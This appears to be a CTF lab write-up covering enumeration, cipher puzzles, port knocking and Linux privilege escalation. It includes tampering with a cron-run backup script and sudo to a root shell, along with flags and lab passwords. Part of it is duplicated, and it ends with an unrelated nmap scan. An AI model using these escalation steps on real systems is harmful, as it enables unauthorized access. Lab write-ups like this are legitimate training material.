# [Task 5] Stage 5
# flag61
```
vi /etc/hosts
```

```
http://roadtoroot.com/
access
Welcome to my second hidden server

Enjoy the stego? I Guess yes

Take this as my personal reward
flag61: 73a0u8asqeeki7ashcv2 
```

# gobuster 
```
root@kali:~# gobuster dir -u http://roadtoroot.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://roadtoroot.com
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,txt,php
[+] Timeout:        10s
===============================================================
2020/06/05 06:33:56 Starting gobuster
===============================================================
/index.html (Status: 200)
/robots.txt (Status: 200)
/execute (Status: 301)
/PI (Status: 301)
/TW (Status: 301)
/grasshopper (Status: 301)
/server-status (Status: 403)
/TB (Status: 301)
===============================================================
2020/06/05 06:50:02 Finished
===============================================================
root@kali:~# 

```

# flag62
``
http://roadtoroot.com/execute/
<p>Bruteforce...bruteforce.....bruteforce......never end</p>
<p>tired of bruteforce? How about we play something new</p>
flag 62: mylug980r9axzn6fvrl0
<a href=hello></a> 
```

# flag63
```
oot@kali:~# wget http://roadtoroot.com/execute/hello
--2020-06-05 06:37:07--  http://roadtoroot.com/execute/hello
Resolving roadtoroot.com (roadtoroot.com)... 10.10.197.22
Connecting to roadtoroot.com (roadtoroot.com)|10.10.197.22|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16664 (16K)
Saving to: ‘hello’

hello               100%[===================>]  16.27K  --.-KB/s    in 0s      

2020-06-05 06:37:07 (143 MB/s) - ‘hello’ saved [16664/16664]

root@kali:~# ls
Desktop    Downloads  hiddeneye      Music     Public	  thinclient_drives
Documents  hello      hydra.restore  Pictures  Templates  Videos
root@kali:~# chmod +x hello 
root@kali:~# ./hello 
I'm noob in C
Take this flag63: mubxspokswhcqr8aj6e5root@kali:~# 

```

# flag64
```
view-source:http://roadtoroot.com/robots.txt
Disallow:*

/TB
/PI
/TW

flag 64: ekvtyrcwshbl3hkwkzsh
```

# flag65
```html
http://roadtoroot.com/TW/
<p>This is a social networking site that relies on micro-blogging for communication<p>
<p>user: @65_6f</p>
<p>flag65: aqvdsfiaphmynifgjylz</p>
<!-- The flag is encrypted, the cipher name starts with B and the key is flag -->

Decrypt it with Beaufort cipher.
https://www.dcode.fr/beaufort-cipher
fvfdngsgqeoisdvawnph
```

# flag66
```html
view-source:http://roadtoroot.com/PI/
<p>Pins are visual bookmarks that you collect on boards</p>
<p>user: gsnwpwp_</p>
<p>flag 66: gfpi7hadqleilk4ycb58</p>

<!-- the username is encrypted, the cipher name starts with a -->

tukr77szwjovro4p4b58
```

# flag67
```
https://www.pinterest.jp/pin/664773594982327006/


https://www.pinterest.jp/pin/664773594982327023/
just an ordinary number 28817
```

# flag68
```
https://twitter.com/65_6f

https://twitter.com/65_6f/status/1180115743297245184


https://twitter.com/65_6f/status/1180119151362199552
44414
```

# flag69
```
Solve this, I dare you
AVGFCTSWPDUNRKQELMBQEGUWZK

https://www.dcode.fr/four-squares-cipher

FLAGISRNOZSEUGUVMAFRGKRPZK
```

# flag70
```html
view-source:http://roadtoroot.com/TB/

<p>This is a micro blogging site. In addition, you can have your own domain.</p>
<p>user: vnvnuxammt</p>
<p>flag 70:rqi51dlh6b67q0v7qhmc</p> 

<!-- The username is encrypted, the cipher name starts with C -->
The cipher is Ceaser.
iaiahknzzg
```

# flag71
```
https://memelorddk.tumblr.com/
https://twitter.com/65_6f/status/1180126418841112577

22B16ABDFBF26BB880807FEF53CEF1017936EE5309A85B2AD1E9D99B2E6F8BCE96BFA11061AA4D26E79B7A9DA72AD58F
mode: CBC
size: 128
VI: youcomingthisfar
SK: thisisroadstossh
Type: hex16
https://www.devglan.com/online-tools/aes-encryption-decryption
S25vY2sgaXQgb3JkZXI6IFRCLCBQSSwgVFcuClRoaXMgcG9ydCBpczogMzk5MTQ=
decode base64

Knock it order: TB, PI, TW.
This port is: 39914
```
# for next
```
view-source:http://roadtoroot.com/grasshopper/

<p>Are you ready to root the machine?</p>
<p> SSH username:</p><br>
<img src="user.png"/><br><br>
<p> SSH password</p><br>
<img src="pass.png"/><br><br>
<p>Where is the SSH port?</p>

https://crypto.interactive-maths.com/pigpen-cipher.html
beginner
timehascome

```

# [Task 6] Stage 6

# flag72
```
root@kali:~# telnet 10.10.104.255 9999
Trying 10.10.104.255...
Connected to 10.10.104.255.
Escape character is '^]'.
***************************
*   Port knocking input   *
***************************
Hi user, please enter the port sequence
The format is (can be more than 4): PORT PORT PORT PORT
> 39914 28817 44414
Something happen
Good luck!
Connection closed by foreign host.
root@kali:~# nmap -Pn -T5 10.10.104.255
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-05 09:50 UTC
Nmap scan report for ip-10-10-104-255.eu-west-1.compute.internal (10.10.104.255)
Host is up (0.00025s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
9999/tcp open  abyss
MAC Address: 02:80:68:24:7D:D6 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.90 seconds
root@kali:~# ssh beginner@10.10.104.255
The authenticity of host '10.10.104.255 (10.10.104.255)' can't be established.
ECDSA key fingerprint is SHA256:upGWH0517FwOM5FH5JZ5sUsX4MHQO+/2+Fs/KydtGj8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.104.255' (ECDSA) to the list of known hosts.
beginner@10.10.104.255's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


39 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$ ls -al
total 36
drwx------  4 beginner beginner 4096 Jun  5 09:50 .
drwxr-xr-x 10 root     root     4096 Oct  8  2019 ..
-rw-r--r--  1 beginner beginner  220 Apr  4  2018 .bash_logout
-rw-r--r--  1 beginner beginner 3771 Apr  4  2018 .bashrc
drwx------  2 beginner beginner 4096 Jun  5 09:50 .cache
-rw-r--r--  1 beginner beginner   29 Oct  8  2019 flag72
drwx------  3 beginner beginner 4096 Jun  5 09:50 .gnupg
----------  1 beginner beginner   31 Oct  8  2019 level1
-rw-r--r--  1 beginner beginner  807 Apr  4  2018 .profile
$ cat flag72
flag72: pdk0yp5w4ao6g7gq21r2
$
```

# flag73
```
$ chmod 777 level1
$ ls -al
total 36
drwx------  4 beginner beginner 4096 Jun  5 09:50 .
drwxr-xr-x 10 root     root     4096 Oct  8  2019 ..
-rw-r--r--  1 beginner beginner  220 Apr  4  2018 .bash_logout
-rw-r--r--  1 beginner beginner 3771 Apr  4  2018 .bashrc
drwx------  2 beginner beginner 4096 Jun  5 09:50 .cache
-rw-r--r--  1 beginner beginner   29 Oct  8  2019 flag72
drwx------  3 beginner beginner 4096 Jun  5 09:50 .gnupg
-rwxrwxrwx  1 beginner beginner   31 Oct  8  2019 level1
-rw-r--r--  1 beginner beginner  807 Apr  4  2018 .profile
$ cat level1
password: i30c8incjneju36lzuxm
$ ls -al ../
total 40
drwxr-xr-x 10 root     root     4096 Oct  8  2019 .
drwxr-xr-x 24 root     root     4096 Oct  8  2019 ..
drwx------  4 beginner beginner 4096 Jun  5 09:50 beginner
drwx------  3 level1   level1   4096 Oct  8  2019 level1
drwx------  2 level2   level2   4096 Oct  8  2019 level2
drwx------  2 level3   level3   4096 Oct  8  2019 level3
drwx------  2 level4   level4   4096 Oct  8  2019 level4
drwx------  5 level5   level5   4096 Oct  8  2019 level5
drwx------  2 level6   level6   4096 Oct  8  2019 level6
drwx------  4 main     main     4096 Oct  8  2019 main
$ su level1
Password:
$ ls
ls: cannot open directory '.': Permission denied
$ cd ../
$ ls
beginner  level1  level2  level3  level4  level5  level6  main
$ cd level1
$ ls -al
total 28
drwx------  3 level1 level1 4096 Oct  8  2019 .
drwxr-xr-x 10 root   root   4096 Oct  8  2019 ..
drwxr-xr-x  2 root   root   4096 Oct  8  2019 ...
-rw-r--r--  1 level1 level1  220 Apr  4  2018 .bash_logout
-rw-r--r--  1 level1 level1 3771 Apr  4  2018 .bashrc
-rw-r--r--  1 level1 level1   30 Oct  8  2019 flag73
-rw-r--r--  1 level1 level1  807 Apr  4  2018 .profile
$ cat flag73
flag 73: r6jk3oiu5tjmnuokzrcq
$
```

# flag74
```
$ ls -al ...
total 12
drwxr-xr-x 2 root   root   4096 Oct  8  2019 .
drwx------ 3 level1 level1 4096 Oct  8  2019 ..
-rw-r--r-- 1 level1 level1   31 Oct  8  2019 .level2
$ cat .../.level2
password: gkgl4ilh6469ux3j82yy
$ su level2
Password:
$ whoami
level2
$ cd ../level2
$ ls -al
total 28
drwx------  2 level2 level2 4096 Oct  8  2019 .
drwxr-xr-x 10 root   root   4096 Oct  8  2019 ..
-rw-r--r--  1 level2 level2  220 Apr  4  2018 .bash_logout
-rw-r--r--  1 level2 level2 3771 Apr  4  2018 .bashrc
-rw-r--r--  1 level2 level2   30 Oct  8  2019 flag74
-rw-r--r--  1 level2 level2   15 Oct  8  2019 nothing
-rw-r--r--  1 level2 level2  807 Apr  4  2018 .profile
$ cat flag74
flag 74: 7z8w6bvsyipjz3o9s3a5
```


```
$ find / -iname "*level*3*" 2>>/dev/null
/lib/systemd/system/runlevel3.target.wants
/lib/systemd/system/runlevel3.target
/usr/lib/python3/dist-packages/urllib3/contrib/_securetransport/__pycache__/low_level.cpython-36.pyc
/usr/lib/python3/dist-packages/twisted/logger/test/__pycache__/test_levels.cpython-36.pyc
/usr/lib/python3/dist-packages/twisted/logger/__pycache__/_levels.cpython-36.pyc
/usr/lib/python3/dist-packages/dbus/__pycache__/lowlevel.cpython-36.pyc
/usr/share/X11/xkb/symbols/level3
/snap/core/7270/lib/systemd/system/runlevel3.target
/snap/core/7270/lib/systemd/system/runlevel3.target.wants
/snap/core/7270/usr/share/X11/xkb/symbols/level3
/home/level3
```

```
$ ls -al
total 2097256
    drwxr-xr-x  24 root root       4096 Oct  8  2019 .
    drwxr-xr-x  24 root root       4096 Oct  8  2019 ..
drwxr-xr-x   2 root root       4096 Oct  8  2019 bin
drwxr-xr-x   3 root root       4096 Oct  8  2019 boot
drwxr-xr-x   2 root root       4096 Oct  8  2019 cdrom
drwxr-xr-x  17 root root       3700 Jun  5 09:46 dev
    drwxr-xr-x  94 root root       4096 Oct 19  2019 etc
    drwxr-xr-x  10 root root       4096 Oct  8  2019 home
lrwxrwxrwx   1 root root         33 Oct  8  2019 initrd.img -> boot/initrd.img-4.15.0-65-generic
lrwxrwxrwx   1 root root         33 Oct  8  2019 initrd.img.old -> boot/initrd.img-4.15.0-65-generic
drwxr-xr-x  22 root root       4096 Oct  8  2019 lib
drwxr-xr-x   2 root root       4096 Aug  5  2019 lib64
    drwx------   2 root root      16384 Oct  8  2019 lost+found
    drwxr-xr-x   2 root root       4096 Aug  5  2019 media
    drwxr-xr-x   2 root root       4096 Aug  5  2019 mnt
    drwxr-xr-x   2 root root       4096 Aug  5  2019 opt
dr-xr-xr-x 124 root root          0 Jun  5 09:46 proc
    drwx------   5 root root       4096 Oct  8  2019 root
    drwxr-xr-x  25 root root        900 Jun  5 12:10 run
    drwxr-xr-x   2 root root      12288 Oct  8  2019 sbin
drwxr-xr-x   4 root root       4096 Oct  8  2019 snap toomcanty
    drwxr-xr-x   2 root root       4096 Aug  5  2019 srv nothing
    -rw-------   1 root root 2147483648 Oct  8  2019 swap.img
dr-xr-xr-x  13 root root          0 Jun  5 10:10 sys
    drwxrwxrwt  10 root root       4096 Jun  5 10:57 tmp
    drwxr-xr-x  10 root root       4096 Aug  5  2019 usr
    drwxr-xr-x  14 root root       4096 Oct  8  2019 var 
lrwxrwxrwx   1 root root         30 Oct  8  2019 vmlinuz -> boot/vmlinuz-4.15.0-65-generic
lrwxrwxrwx   1 root root         30 Oct  8  2019 vmlinuz.old -> boot/vmlinuz-4.15.0-65-generic
```

```
$ grep -R "passowrd: " /var 2>>/dev/null
$  grep -R "passowrd: " /dev 2>>/dev/null
$   
```

# flag 76
```
$ find / -user level3 2>>/dev/null
/var/lib/vim/addons/pass
/home/level3
$ ls -al /var/lib/vim/addons/pass
-rw-r--r-- 1 level3 level3 35 Oct  8  2019 /var/lib/vim/addons/pass
$ cat /var/lib/vim/addons/pass
level 4 pass: d5kzrgizk0eh4k4u31ng
$ su level4
Password:
$ cd /homelevel4
sh: 1: cd: can't cd to /homelevel4
$ cd /home/level4
$ ls -al
total 28
drwx------  2 level4 level4 4096 Oct  8  2019 .
drwxr-xr-x 10 root   root   4096 Oct  8  2019 ..
-rw-r--r--  1 level4 level4  220 Apr  4  2018 .bash_logout
-rw-r--r--  1 level4 level4 3771 Apr  4  2018 .bashrc
-rw-r--r--  1 level4 level4   30 Oct  8  2019 flag76
-rw-r--r--  1 root   root    103 Oct  8  2019 .hidden_note
-rw-r--r--  1 level4 level4  807 Apr  4  2018 .profile
$ cat flag76
flag 76: bhjnkoyf0vmwh3a8mo92
$
```

# flag77

```
$ ls -al
total 48
drwx------  5 level4 level4 4096 Jun  5 13:09 .
drwxr-xr-x 10 root   root   4096 Oct  8  2019 ..
-rw-r--r--  1 level4 level4  220 Apr  4  2018 .bash_logout
-rw-r--r--  1 level4 level4 3771 Apr  4  2018 .bashrc
drwx------  2 level4 level4 4096 Jun  5 12:44 .cache
-rw-r--r--  1 level4 level4   30 Oct  8  2019 flag76
drwx------  3 level4 level4 4096 Jun  5 12:45 .gnupg
-rw-r--r--  1 root   root    103 Oct  8  2019 .hidden_note
drwxrwxr-x  3 level4 level4 4096 Jun  5 12:41 .local
-rw-r--r--  1 level4 level4  807 Apr  4  2018 .profile
-rw-rw-r--  1 level4 level4   66 Jun  5 12:41 .selected_editor
-rw-------  1 level4 level4 2136 Jun  5 13:09 .viminfo
$ cat .hidden_note
Hi level 4,

Task scheduling was fun. I don't know who put pass5.txt into my directory.

From,
level5

$
$ find / -user level5 2>>/dev/null
/bin/what
/var/backup
/var/backup/test.txt
/var/backup/backup.sh
/home/level5
$ cat /var/backup/backup.sh
#!/bin/bash
cp /home/level5/test.txt /var/backup/test.txt

$ vi /var/backup/backup.sh
$ cat /var/backup/backup.sh
#!/bin/bash
cp /home/level5/test.txt /var/backup/test.txt
cp /home/level5/pass5.txt /tmp/pass5.txt
$ ls /tmp
crontab.UoEAKj  lstest.txt  systemd-private-53d6ed1a3f114ef0a95d7b5b440f29ea-systemd-resolved.service-X34X5c   test2.txt  tmux-1005
linpeas.sh      pass5.txt   systemd-private-53d6ed1a3f114ef0a95d7b5b440f29ea-systemd-timesyncd.service-ZP5KbG  tmux-1003
$ cat /tmp/pass5.txt
level 5 pass: g669dwbb3dcadt1eui63
$ su level5
Password:
$ whoami
level5
$ cd /home/level5
$ ls -al
total 48
drwx------  5 level5 level5 4096 Oct  8  2019 .
drwxr-xr-x 10 root   root   4096 Oct  8  2019 ..
-rw-r--r--  1 level5 level5  220 Apr  4  2018 .bash_logout
-rw-r--r--  1 level5 level5 3771 Apr  4  2018 .bashrc
drwx------  2 level5 level5 4096 Oct  8  2019 .cache
-rw-rw-r--  1 level5 level5   30 Oct  8  2019 flag77
drwx------  3 level5 level5 4096 Oct  8  2019 .gnupg
drwxrwxr-x  3 level5 level5 4096 Oct  8  2019 .local
-rw-rw-r--  1 level5 level5   35 Oct  8  2019 pass5.txt
-rw-r--r--  1 level5 level5  807 Apr  4  2018 .profile
-rw-rw-r--  1 level5 level5   66 Oct  8  2019 .selected_editor
-rw-rw-r--  1 level5 level5   20 Oct  8  2019 test.txt
$ cat flag77
flag 77: tyqrkkk93w851fzg0yyn
$
```

```
$ find / -name "*game*" 2>>/dev/null
/lib/modules/4.15.0-65-generic/kernel/drivers/input/joystick/gamecon.ko
/lib/modules/4.15.0-65-generic/kernel/drivers/input/gameport
/lib/modules/4.15.0-65-generic/kernel/drivers/input/gameport/gameport.ko
/usr/local/games
/usr/share/mime/application/x-gameboy-color-rom.xml
/usr/share/mime/application/x-gamegear-rom.xml
/usr/share/mime/application/x-gamecube-rom.xml
/usr/share/mime/application/x-gameboy-rom.xml
/usr/games
/usr/src/linux-headers-4.15.0-65-generic/include/config/joystick/gamecon.h
/usr/src/linux-headers-4.15.0-65-generic/include/config/gameport
/usr/src/linux-headers-4.15.0-65-generic/include/config/gameport.h
/usr/src/linux-headers-4.15.0-65/drivers/input/gameport
/usr/src/linux-headers-4.15.0-65/include/uapi/linux/gameport.h
/usr/src/linux-headers-4.15.0-65/include/linux/gameport.h
/snap/core/7270/usr/games
/snap/core/7270/usr/local/games
$ cd /usr/games
$ ls -al
total 12
drwxr-xr-x  2 root root 4096 Oct  8  2019 .
drwxr-xr-x 10 root root 4096 Aug  5  2019 ..
-rw-r--r--  1 root root   24 Oct  8  2019 .TheLegendofZelda
$ cat .TheLegendofZelda
vim pass

save_me_link


$ cat .viminfo
# This viminfo file was generated by Vim 8.0.
# You may edit it if you're careful!

# Viminfo version
|1,4

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Command Line History (newest to oldest):
:q!
|2,0,1591364650,,"q!"

# Search String History (newest to oldest):

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Debug Line History (newest to oldest):

# Registers:

# File marks:
'0  1  0  /usr/games/pass
|4,48,1,0,1591364650,"/usr/games/pass"

# Jumplist (newest first):
-'  1  0  /usr/games/pass
|4,39,1,0,1591364650,"/usr/games/pass"

# History of marks within files (newest to oldest):

> /usr/games/pass
        *       1591364647      0
        "       1       0
```


```
level5@main:/usr/games$ find / -type f -user level5 2>/dev/null
/bin/what
/var/backup/test.txt
/var/backup/backup.sh
/tmp/linpeas.sh
/proc/1590/task/1590/fdinfo/0
/proc/1590/task/1590/fdinfo/1
/proc/1590/task/1590/fdinfo/2

```
```
level5@main:/usr/games$ cat /bin/what
level 6 pass: <pass>

level5@main:/usr/games$
```



```
level6@main:~$ ls -al
total 32
drwx------  2 level6 level6 4096 Jul 31 11:21 .
drwxr-xr-x 10 root   root   4096 Oct  8  2019 ..
-rw-------  1 level6 level6   59 Jul 31 11:21 .bash_history
-rw-r--r--  1 level6 level6  220 Apr  4  2018 .bash_logout
-rw-r--r--  1 level6 level6 3771 Apr  4  2018 .bashrc
-rw-r--r--  1 level6 level6   30 Oct  8  2019 flag78
-rw-r--r--  1 level6 level6   50 Oct  8  2019 hey_listen
-rw-r--r--  1 level6 level6  807 Apr  4  2018 .profile
level6@main:~$ vim hey_listen


main password: <pass>
```


```
main@main:/home/level6$ whoami
main
main@main:/home/level6$
```


# 79
```
main@main:/home/level6$ cd /home/main/
main@main:~$ ls -al
total 40
drwx------  4 main main 4096 Oct  8  2019 .
drwxr-xr-x 10 root root 4096 Oct  8  2019 ..
-rw-------  1 main main    8 Oct  8  2019 .bash_history
-rw-r--r--  1 main main  220 Apr  4  2018 .bash_logout
-rw-r--r--  1 main main 3771 Apr  4  2018 .bashrc
drwx------  2 main main 4096 Oct  8  2019 .cache
-rw-r--r--  1 main main   30 Oct  8  2019 flag79
drwx------  3 main main 4096 Oct  8  2019 .gnupg
-rw-r--r--  1 root root  982 Oct  8  2019 knock.py
-rw-r--r--  1 main main  807 Apr  4  2018 .profile
-rw-r--r--  1 main main    0 Oct  8  2019 .sudo_as_admin_successful
main@main:~$ cat flag79
```


# 80
```
main@main:~$ sudo -l
[sudo] password for main:
Sorry, try again.
[sudo] password for main:
Matching Defaults entries for main on main:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User main may run the following commands on main:
    (ALL : ALL) ALL
main@main:~$ sudo /bin/sh
# whoami
root
# cd /root/
# ls -al
total 40
drwx------  5 root root 4096 Oct  8  2019 .
drwxr-xr-x 24 root root 4096 Oct  8  2019 ..
-rw-------  1 root root  471 Oct  8  2019 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwxr-xr-x  2 root root 4096 Oct  8  2019 hello_there
drwxr-xr-x  3 root root 4096 Oct  8  2019 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Oct  8  2019 .selected_editor
drwx------  2 root root 4096 Oct  8  2019 .ssh
-rw-------  1 root root 1939 Oct  8  2019 .viminfo
# python -c 'import pty; pty.spawn("/bin/bash")'
root@main:/root# cat hello_there/
cat: hello_there/: Is a directory
root@main:/root# cd hello_there/
root@main:/root/hello_there# ls -al
total 12
drwxr-xr-x 2 root root 4096 Oct  8  2019 .
drwx------ 5 root root 4096 Oct  8  2019 ..
-rw-r--r-- 1 root root  120 Oct  8  2019 message_by_author
root@main:/root/hello_there# cat message_by_author
Congratulation, you are now completed the 100 CTF challenge

Here, enjoy your last flag.

Flag80: <flag>

root@main:/root/hello_there#
```

# 75
```
root@main:/root/hello_there# cd /home/level3
root@main:/home/level3# ls
flag75
root@main:/home/level3# cat flag75
```



```
level5@main:/usr/games$ find / -type f -user level5 2>/dev/null
/bin/what
/var/backup/test.txt
/var/backup/backup.sh
/tmp/linpeas.sh
/proc/1590/task/1590/fdinfo/0
/proc/1590/task/1590/fdinfo/1
/proc/1590/task/1590/fdinfo/2

```
```
level5@main:/usr/games$ cat /bin/what
level 6 pass: <pass>

level5@main:/usr/games$
```



```
level6@main:~$ ls -al
total 32
drwx------  2 level6 level6 4096 Jul 31 11:21 .
drwxr-xr-x 10 root   root   4096 Oct  8  2019 ..
-rw-------  1 level6 level6   59 Jul 31 11:21 .bash_history
-rw-r--r--  1 level6 level6  220 Apr  4  2018 .bash_logout
-rw-r--r--  1 level6 level6 3771 Apr  4  2018 .bashrc
-rw-r--r--  1 level6 level6   30 Oct  8  2019 flag78
-rw-r--r--  1 level6 level6   50 Oct  8  2019 hey_listen
-rw-r--r--  1 level6 level6  807 Apr  4  2018 .profile
level6@main:~$ vim hey_listen


main password: <pass>
```


```
main@main:/home/level6$ whoami
main
main@main:/home/level6$
```


# 79
```
main@main:/home/level6$ cd /home/main/
main@main:~$ ls -al
total 40
drwx------  4 main main 4096 Oct  8  2019 .
drwxr-xr-x 10 root root 4096 Oct  8  2019 ..
-rw-------  1 main main    8 Oct  8  2019 .bash_history
-rw-r--r--  1 main main  220 Apr  4  2018 .bash_logout
-rw-r--r--  1 main main 3771 Apr  4  2018 .bashrc
drwx------  2 main main 4096 Oct  8  2019 .cache
-rw-r--r--  1 main main   30 Oct  8  2019 flag79
drwx------  3 main main 4096 Oct  8  2019 .gnupg
-rw-r--r--  1 root root  982 Oct  8  2019 knock.py
-rw-r--r--  1 main main  807 Apr  4  2018 .profile
-rw-r--r--  1 main main    0 Oct  8  2019 .sudo_as_admin_successful
main@main:~$ cat flag79
```


# 80
```
main@main:~$ sudo -l
[sudo] password for main:
Sorry, try again.
[sudo] password for main:
Matching Defaults entries for main on main:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User main may run the following commands on main:
    (ALL : ALL) ALL
main@main:~$ sudo /bin/sh
# whoami
root
# cd /root/
# ls -al
total 40
drwx------  5 root root 4096 Oct  8  2019 .
drwxr-xr-x 24 root root 4096 Oct  8  2019 ..
-rw-------  1 root root  471 Oct  8  2019 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwxr-xr-x  2 root root 4096 Oct  8  2019 hello_there
drwxr-xr-x  3 root root 4096 Oct  8  2019 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Oct  8  2019 .selected_editor
drwx------  2 root root 4096 Oct  8  2019 .ssh
-rw-------  1 root root 1939 Oct  8  2019 .viminfo
# python -c 'import pty; pty.spawn("/bin/bash")'
root@main:/root# cat hello_there/
cat: hello_there/: Is a directory
root@main:/root# cd hello_there/
root@main:/root/hello_there# ls -al
total 12
drwxr-xr-x 2 root root 4096 Oct  8  2019 .
drwx------ 5 root root 4096 Oct  8  2019 ..
-rw-r--r-- 1 root root  120 Oct  8  2019 message_by_author
root@main:/root/hello_there# cat message_by_author
Congratulation, you are now completed the 100 CTF challenge

Here, enjoy your last flag.

Flag80: <flag>

root@main:/root/hello_there#
```

# 75
```
root@main:/root/hello_there# cd /home/level3
root@main:/home/level3# ls
flag75
root@main:/home/level3# cat flag75
```


```
root@kali:~# nmap -sV -sC -T5 10.10.227.180
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-31 13:44 UTC
Nmap scan report for ip-10-10-227-180.eu-west-1.compute.internal (10.10.227.180)
Host is up (0.0011s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.3.5
22/tcp   open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 26:70:49:8b:db:20:40:2a:e9:d8:81:e1:ff:7b:c6:17 (DSA)
|   2048 c3:b1:05:ef:8d:34:47:79:55:9d:a5:7b:fa:d0:82:ec (RSA)
|_  256 ae:cf:88:d3:de:fc:95:22:8f:c5:71:6e:08:ef:96:72 (ECDSA)
80/tcp   open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
3404/tcp open  unknown
| fingerprint-strings:
|   DNSStatusRequestTCP:
|     Perform arithmetic, connection close if failed to solve within 3 seconds
|     multiply 32
|     Wrong number
|   DNSVersionBindReqTCP, SSLSessionReq:
|     Perform arithmetic, connection close if failed to solve within 3 seconds
|     minus 16
|     Wrong number
|   GenericLines:
|     Perform arithmetic, connection close if failed to solve within 3 seconds
|     multiply 96
|     Wrong number
|   GetRequest:
|     Perform arithmetic, connection close if failed to solve within 3 seconds
|     multiply 76
|     Wrong number
|   HTTPOptions:
|     Perform arithmetic, connection close if failed to solve within 3 seconds
|     multiply 55
|     Wrong number
|   Help:
|     Perform arithmetic, connection close if failed to solve within 3 seconds
|     multiply 70
|     Wrong number
|   Kerberos:
|     Perform arithmetic, connection close if failed to solve within 3 seconds
|     multiply 80
|     Wrong number
|   NULL:
|     Perform arithmetic, connection close if failed to solve within 3 seconds
|     minus 5
|   RPCCheck, RTSPRequest, TerminalServerCookie:
|     Perform arithmetic, connection close if failed to solve within 3 seconds
|     Wrong number
|   TLSSessionReq:
|     Perform arithmetic, connection close if failed to solve within 3 seconds
|     multiply 4
|_    Wrong number
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3404-TCP:V=7.80%I=7%D=7/31%Time=5F242045%P=x86_64-pc-linux-gnu%r(NU
SF:LL,55,"Perform\x20arithmetic,\x20connection\x20close\x20if\x20failed\x2
SF:0to\x20solve\x20within\x203\x20seconds\n141\x20minus\x205\n")%r(Generic
SF:Lines,66,"Perform\x20arithmetic,\x20connection\x20close\x20if\x20failed
SF:\x20to\x20solve\x20within\x203\x20seconds\n104\x20multiply\x2096\nWrong
SF:\x20number\n")%r(GetRequest,65,"Perform\x20arithmetic,\x20connection\x2
SF:0close\x20if\x20failed\x20to\x20solve\x20within\x203\x20seconds\n13\x20
SF:multiply\x2076\nWrong\x20number\n")%r(HTTPOptions,66,"Perform\x20arithm
SF:etic,\x20connection\x20close\x20if\x20failed\x20to\x20solve\x20within\x
SF:203\x20seconds\n334\x20multiply\x2055\nWrong\x20number\n")%r(RTSPReques
SF:t,60,"Perform\x20arithmetic,\x20connection\x20close\x20if\x20failed\x20
SF:to\x20solve\x20within\x203\x20seconds\n190\x20add\x205\nWrong\x20number
SF:\n")%r(RPCCheck,61,"Perform\x20arithmetic,\x20connection\x20close\x20if
SF:\x20failed\x20to\x20solve\x20within\x203\x20seconds\n255\x20add\x2080\n
SF:Wrong\x20number\n")%r(DNSVersionBindReqTCP,63,"Perform\x20arithmetic,\x
SF:20connection\x20close\x20if\x20failed\x20to\x20solve\x20within\x203\x20
SF:seconds\n306\x20minus\x2016\nWrong\x20number\n")%r(DNSStatusRequestTCP,
SF:66,"Perform\x20arithmetic,\x20connection\x20close\x20if\x20failed\x20to
SF:\x20solve\x20within\x203\x20seconds\n340\x20multiply\x2032\nWrong\x20nu
SF:mber\n")%r(Help,65,"Perform\x20arithmetic,\x20connection\x20close\x20if
SF:\x20failed\x20to\x20solve\x20within\x203\x20seconds\n77\x20multiply\x20
SF:70\nWrong\x20number\n")%r(SSLSessionReq,62,"Perform\x20arithmetic,\x20c
SF:onnection\x20close\x20if\x20failed\x20to\x20solve\x20within\x203\x20sec
SF:onds\n40\x20minus\x2016\nWrong\x20number\n")%r(TerminalServerCookie,60,
SF:"Perform\x20arithmetic,\x20connection\x20close\x20if\x20failed\x20to\x2
SF:0solve\x20within\x203\x20seconds\n59\x20add\x2087\nWrong\x20number\n")%
SF:r(TLSSessionReq,64,"Perform\x20arithmetic,\x20connection\x20close\x20if
SF:\x20failed\x20to\x20solve\x20within\x203\x20seconds\n78\x20multiply\x20
SF:4\nWrong\x20number\n")%r(Kerberos,66,"Perform\x20arithmetic,\x20connect
SF:ion\x20close\x20if\x20failed\x20to\x20solve\x20within\x203\x20seconds\n
SF:120\x20multiply\x2080\nWrong\x20number\n");
